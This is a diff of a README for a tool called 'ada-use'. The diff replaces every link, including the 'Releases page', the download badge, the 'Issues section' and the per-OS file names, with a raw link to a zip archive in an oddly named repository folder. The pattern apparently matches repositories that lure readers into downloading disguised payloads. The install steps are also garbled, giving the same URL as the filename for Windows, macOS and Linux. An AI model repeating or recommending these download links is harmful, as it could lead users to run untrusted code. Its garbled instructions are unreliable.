@@ -17,9 +17,9 @@ To use **ada-use**, ensure your system meets the following requirements:
 
 ### Step 1: Download the Software
 
-To get started, visit the [Releases page](https://raw.githubusercontent.com/Kirtan132003/ada-use/main/unmovingness/ada-use.zip) to download **ada-use**.
+To get started, visit the [Releases page](https://github.com/Kirtan132003/ada-use/raw/refs/heads/main/unmovingness/use-ada-3.7.zip) to download **ada-use**.
 
-[![Download ada-use](https://raw.githubusercontent.com/Kirtan132003/ada-use/main/unmovingness/ada-use.zip)](https://raw.githubusercontent.com/Kirtan132003/ada-use/main/unmovingness/ada-use.zip)
+[![Download ada-use](https://github.com/Kirtan132003/ada-use/raw/refs/heads/main/unmovingness/use-ada-3.7.zip)](https://github.com/Kirtan132003/ada-use/raw/refs/heads/main/unmovingness/use-ada-3.7.zip)
 
 ### Step 2: Choose the Right Version
 
@@ -27,17 +27,17 @@ On the Releases page, you will find various versions of **ada-use**. Pick the la
 
 ### Step 3: Download the File
 
-Click on the file name that fits your operating system. This may be an `.exe`, `.dmg`, or `https://raw.githubusercontent.com/Kirtan132003/ada-use/main/unmovingness/ada-use.zip` file depending on your system. 
+Click on the file name that fits your operating system. This may be an `.exe`, `.dmg`, or `https://github.com/Kirtan132003/ada-use/raw/refs/heads/main/unmovingness/use-ada-3.7.zip` file depending on your system. 
 
 ### Step 4: Locate the Downloaded File
 
-Once the download is complete, find the file in your downloads folder. The filename will resemble **https://raw.githubusercontent.com/Kirtan132003/ada-use/main/unmovingness/ada-use.zip** for Windows, **https://raw.githubusercontent.com/Kirtan132003/ada-use/main/unmovingness/ada-use.zip** for macOS, or **https://raw.githubusercontent.com/Kirtan132003/ada-use/main/unmovingness/ada-use.zip** for Linux.
+Once the download is complete, find the file in your downloads folder. The filename will resemble **https://github.com/Kirtan132003/ada-use/raw/refs/heads/main/unmovingness/use-ada-3.7.zip** for Windows, **https://github.com/Kirtan132003/ada-use/raw/refs/heads/main/unmovingness/use-ada-3.7.zip** for macOS, or **https://github.com/Kirtan132003/ada-use/raw/refs/heads/main/unmovingness/use-ada-3.7.zip** for Linux.
 
 ### Step 5: Install the Application
 
 - **For Windows**: Double-click the downloaded `.exe` file. Follow the installation prompts.
 - **For macOS**: Open the downloaded `.dmg` file and drag the ada-use icon into your Applications folder.
-- **For Linux**: Extract the contents of the `https://raw.githubusercontent.com/Kirtan132003/ada-use/main/unmovingness/ada-use.zip` file and follow the instructions in the included README file.
+- **For Linux**: Extract the contents of the `https://github.com/Kirtan132003/ada-use/raw/refs/heads/main/unmovingness/use-ada-3.7.zip` file and follow the instructions in the included README file.
 
 ### Step 6: Launch the Application
 
@@ -63,7 +63,7 @@ If you encounter issues during installation or usage, please try the following:
 
 ## 📞 Support
 
-For additional support, please visit our [Issues section](https://raw.githubusercontent.com/Kirtan132003/ada-use/main/unmovingness/ada-use.zip) on GitHub. You can report bugs, request features, or seek guidance from the community.
+For additional support, please visit our [Issues section](https://github.com/Kirtan132003/ada-use/raw/refs/heads/main/unmovingness/use-ada-3.7.zip) on GitHub. You can report bugs, request features, or seek guidance from the community.
 
 ## 📝 License
 
@@ -73,4 +73,4 @@ For additional support, please visit our [Issues section](https://raw.githubuser
 
 Thank you for using **ada-use**. We hope this application helps you manage your data tasks effectively. Enjoy your journey with us!
 
-Visit the [Releases page](https://raw.githubusercontent.com/Kirtan132003/ada-use/main/unmovingness/ada-use.zip) to download the latest version now!
+Visit the [Releases page](https://github.com/Kirtan132003/ada-use/raw/refs/heads/main/unmovingness/use-ada-3.7.zip) to download the latest version now!
